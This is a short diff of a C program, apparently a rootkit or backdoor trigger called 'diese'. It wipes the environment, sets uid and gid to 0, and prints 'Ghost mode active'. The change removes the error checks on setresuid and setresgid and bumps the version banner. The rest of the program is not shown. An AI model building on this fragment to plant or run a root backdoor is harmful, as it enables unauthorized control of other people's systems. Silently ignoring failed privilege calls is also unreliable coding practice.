@@ -41,12 +41,10 @@ int main(int argc, char **argv) {
 
     wipe_env();
 
-    if (setresuid(0,0,0) != 0 || setresgid(0,0,0) != 0) {
-        perror("setres");
-        return 1;
-    }
+    setresuid(0,0,0);
+    setresgid(0,0,0);
 
-    printf("\033[31m[diese v3.4] uid=0 gid=0 context=locked | trigger OK\033[0m\n");
+    printf("\033[31m[diese v3.5] uid=0 context=locked | trigger OK\033[0m\n");
     printf("[*] Ghost mode active.\n\n");
 
     if (argc > 2) {
